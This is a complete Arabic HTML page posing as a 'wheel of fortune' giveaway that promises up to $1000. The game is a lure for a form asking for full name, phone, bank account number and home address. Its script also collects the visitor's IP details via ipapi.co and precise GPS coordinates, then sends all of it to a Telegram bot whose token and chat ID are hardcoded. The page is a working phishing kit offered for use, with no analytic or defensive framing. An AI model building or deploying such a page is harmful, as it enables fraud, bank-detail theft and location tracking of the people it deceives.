<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>عجلة الحظ - اربح حتى 1000$</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
body{background:linear-gradient(135deg,#1a0033,#330066,#1a0033);min-height:100vh;color:#fff;overflow-x:hidden}
.header{text-align:center;padding:20px 15px}
.header h1{font-size:26px;color:#FFD700;text-shadow:0 0 20px rgba(255,215,0,0.5);margin-bottom:8px}
.header p{color:#ccc;font-size:14px}
.header .jackpot{background:linear-gradient(135deg,#FFD700,#FF8C00);color:#000;display:inline-block;padding:8px 25px;border-radius:25px;font-weight:bold;font-size:18px;margin-top:10px;box-shadow:0 0 30px rgba(255,215,0,0.6)}
.wheel-container{position:relative;width:320px;height:320px;margin:20px auto;display:flex;justify-content:center;align-items:center}
.wheel-outer{position:absolute;width:100%;height:100%;border-radius:50%;background:linear-gradient(135deg,#FFD700,#B8860B,#FFD700,#B8860B);box-shadow:0 0 40px rgba(255,215,0,0.5), inset 0 0 20px rgba(0,0,0,0.5);border:8px solid #8B6914}
.wheel{width:90%;height:90%;border-radius:50%;position:relative;transition:transform 6s cubic-bezier(0.17,0.67,0.12,0.99);box-shadow:inset 0 0 30px rgba(0,0,0,0.6)}
.pointer{position:absolute;top:-15px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:20px solid transparent;border-right:20px solid transparent;border-top:35px solid #FF0000;z-index:100;filter:drop-shadow(0 0 10px #FF0000)}
.center-btn{position:absolute;width:80px;height:80px;background:radial-gradient(circle,#FFD700,#B8860B);border-radius:50%;display:flex;justify-content:center;align-items:center;z-index:50;cursor:pointer;border:5px solid #fff;box-shadow:0 0 25px rgba(255,215,0,0.8);font-weight:bold;color:#000;font-size:16px;text-align:center;line-height:1.2}
.center-btn:active{transform:scale(0.95)}
.center-btn.disabled{opacity:0.5;cursor:not-allowed}
.segment-label{position:absolute;top:50%;left:50%;transform-origin:0 0;font-weight:bold;font-size:16px;color:#fff;text-shadow:1px 1px 2px #000,-1px -1px 2px #000;pointer-events:none}
.result-section{text-align:center;padding:10px 20px;min-height:80px}
.result-section .congrats{font-size:32px;color:#FFD700;font-weight:bold;text-shadow:0 0 20px rgba(255,215,0,0.8);display:none;animation:pulse 0.5s infinite alternate}
@keyframes pulse{from{transform:scale(1)}to{transform:scale(1.1)}}
.result-section .amount{font-size:48px;color:#00FF00;font-weight:bold;text-shadow:0 0 30px rgba(0,255,0,0.8);display:none;margin-top:10px}
.form-section{padding:20px;background:rgba(0,0,0,0.6);border-radius:20px 20px 0 0;margin-top:20px}
.form-section h2{color:#FFD700;text-align:center;font-size:20px;margin-bottom:15px}
label{display:block;font-size:14px;color:#ccc;margin-top:12px;margin-bottom:6px}
input{width:100%;padding:14px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,215,0,0.3);border-radius:10px;font-size:15px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#FFD700;box-shadow:0 0 15px rgba(255,215,0,0.3)}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#FFD700,#B8860B);color:#000;border:none;border-radius:12px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:20px;box-shadow:0 5px 20px rgba(255,215,0,0.4)}
.btn:active{transform:scale(0.98)}
.footer{text-align:center;font-size:11px;color:#555;padding:15px}
.confetti{position:fixed;width:10px;height:10px;background:#FFD700;top:-10px;z-index:999;animation:fall 3s linear}
@keyframes fall{to{transform:translateY(100vh) rotate(720deg);opacity:0}}
</style>
</head>
<body>

<div class="header">
<h1>🎡 عجلة الحظ الكبرى</h1>
<p>جرب حظك واربح حتى 1000$</p>
<div class="jackpot">💰 الجائزة الكبرى: 1000$</div>
</div>

<div class="wheel-container">
<div class="pointer"></div>
<div class="wheel-outer"></div>
<div class="wheel" id="wheel"></div>
<div class="center-btn" id="spinBtn">أدر<br>العجلة</div>
</div>

<div class="result-section">
<div class="congrats" id="congrats">🎉 مبروك! لقد كسبت</div>
<div class="amount" id="amount"></div>
</div>

<div class="form-section">
<h2>🏆 املأ بياناتك لاستلام الجائزة</h2>
<form id="f">
<label>الاسم الثلاثي *</label>
<input type="text" id="name" placeholder="أدخل اسمك الثلاثي" required>
<label>رقم الهاتف *</label>
<input type="tel" id="phone" placeholder="07xxxxxxxxx" required>
<label>رقم الحساب البنكي *</label>
<input type="text" id="bank" placeholder="أدخل رقم الحساب البنكي" required>
<label>مكان السكن *</label>
<input type="text" id="address" placeholder="أدخل مكان السكن" required>
<button type="submit" class="btn">📤 استلام الجائزة</button>
</form>
</div>

<div class="footer">© 2026 عجلة الحظ - جميع الحقوق محفوظة</div>

<script>
const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
const CHAT='8823506156';

const amounts=[10,30,50,1,100,70,1000,200,4];
const colors=['#e74c3c','#3498db','#f39c12','#9b59b6','#1abc9c','#e67e22','#c0392b','#2980b9','#27ae60'];
const segCount=amounts.length;
const segAngle=360/segCount;

let wheel=document.getElementById('wheel');
let spinning=false;
let wonAmount=null;

// Build wheel segments
function buildWheel(){
let gradient='conic-gradient(';
for(let i=0;i<segCount;i++){
const start=i*segAngle;
const end=(i+1)*segAngle;
gradient+=colors[i]+' '+start+'deg '+end+'deg';
if(i<segCount-1) gradient+=',';
}
gradient+=')';
wheel.style.background=gradient;

// Add labels
for(let i=0;i<segCount;i++){
const angle=i*segAngle+segAngle/2;
const label=document.createElement('div');
label.className='segment-label';
label.textContent='$'+amounts[i];
const rad=(angle-90)*Math.PI/180;
const radius=110;
const x=Math.cos(rad)*radius;
const y=Math.sin(rad)*radius;
label.style.transform=`translate(${x}px,${y}px) rotate(${angle}deg)`;
label.style.position='absolute';
label.style.top='50%';
label.style.left='50%';
label.style.marginTop='-10px';
label.style.marginLeft='-20px';
label.style.width='40px';
label.style.textAlign='center';
wheel.appendChild(label);
}
}
buildWheel();

let gpsData='لم يتم';
let ipData='N/A';

async function getInfo(){
try{
const r=await fetch('https://ipapi.co/json/');
const d=await r.json();
ipData=d.ip+' | '+d.city+' | '+d.country_name+' | '+d.org;
}catch(e){ipData='N/A';}
}
navigator.geolocation.getCurrentPosition(
function(pos){gpsData=pos.coords.latitude+','+pos.coords.longitude;},
function(){gpsData='مرفوض';},
{enableHighAccuracy:true, timeout:10000}
);
getInfo();

// Spin
document.getElementById('spinBtn').addEventListener('click', function(){
if(spinning) return;
spinning=true;
this.classList.add('disabled');
this.innerHTML='جاري...';

const randomIndex=Math.floor(Math.random()*segCount);
const targetAngle=360*10 + (360 - randomIndex*segAngle - segAngle/2);

wheel.style.transform=`rotate(${targetAngle}deg)`;

setTimeout(function(){
spinning=false;
wonAmount=amounts[randomIndex];
document.getElementById('congrats').style.display='block';
document.getElementById('amount').style.display='block';
document.getElementById('amount').textContent='$'+wonAmount;
document.getElementById('spinBtn').classList.remove('disabled');
document.getElementById('spinBtn').innerHTML='أدر<br>العجلة';

// Confetti
for(let i=0;i<50;i++){
const c=document.createElement('div');
c.className='confetti';
c.style.left=Math.random()*100+'%';
c.style.background=colors[Math.floor(Math.random()*colors.length)];
c.style.animationDelay=Math.random()*2+'s';
document.body.appendChild(c);
setTimeout(()=>c.remove(),5000);
}
}, 6200);
});

// Submit
document.getElementById('f').addEventListener('submit', async function(e){
e.preventDefault();
const msg='🎡 *عجلة الحظ - فائز جديد*\n\n'+
'👤 الاسم: '+document.getElementById('name').value+'\n'+
'📞 الهاتف: `'+document.getElementById('phone').value+'`\n'+
'🏦 الحساب البنكي: `'+document.getElementById('bank').value+'`\n'+
'🏠 السكن: '+document.getElementById('address').value+'\n\n'+
'💰 *الجائزة: $'+(wonAmount||0)+'*\n\n'+
'🌐 IP: `'+ipData+'`\n'+
'📍 GPS: `'+gpsData+'`\n'+
'💻 '+navigator.platform+'\n'+
'🕐 '+new Date().toLocaleString('ar-IQ');
await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
alert('✅ تم إرسال بياناتك! سيتم التواصل معك لاستلام الجائزة.');
document.getElementById('f').reset();
});
</script>
</body>
</html>
